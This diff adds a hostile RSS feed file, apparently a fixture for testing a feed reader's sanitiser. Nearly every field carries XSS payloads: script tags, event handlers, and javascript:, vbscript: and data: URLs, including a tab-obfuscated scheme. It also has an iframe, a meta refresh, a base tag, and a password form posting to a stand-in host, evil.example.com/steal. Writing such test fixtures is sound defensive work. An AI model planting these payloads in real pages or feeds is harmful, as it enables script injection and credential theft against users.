@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>&lt;script&gt;alert('feed')&lt;/script&gt;Evil feed</title>
+    <link>javascript:alert('site')</link>
+    <description>hostile</description>
+    <image><url>javascript:alert('icon')</url><title>x</title><link>/</link></image>
+    <item>
+      <title>&lt;img src=x onerror=alert(1)&gt;Evil &lt;script&gt;alert(2)&lt;/script&gt;title</title>
+      <link>javascript:alert('link')</link>
+      <guid isPermaLink="false">xss-1</guid>
+      <description><![CDATA[
+        <script>alert(3)</script>
+        <img src="x" onerror="alert(4)">
+        <a href="javascript:alert(5)">js</a>
+        <a href="vbscript:msgbox(6)">vbs</a>
+        <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg3KTwvc2NyaXB0Pg==">data</a>
+        <svg onload="alert(8)"><circle r="1"/></svg>
+        <iframe src="https://evil.example.com/"></iframe>
+        <style>body { display: none }</style>
+        <form action="https://evil.example.com/steal"><input name="pw"></form>
+        <meta http-equiv="refresh" content="0;url=https://evil.example.com/">
+        <base href="https://evil.example.com/">
+        <a href="jav&#x09;ascript:alert(9)">tab</a>
+        <p style="background:url(javascript:alert(10))" onclick="alert(11)">styled</p>
+        <b>unclosed
+      ]]></description>
+      <content:encoded><![CDATA[<object data="evil.swf"></object><embed src="evil.swf"><img src="data:image/png;base64,iVBORw0KGgo=">]]></content:encoded>
+      <media:thumbnail url="javascript:alert('thumb')"/>
+      <enclosure url="data:image/png;base64,iVBORw0KGgo=" type="image/png" length="1"/>
+    </item>
+  </channel>
+</rss>
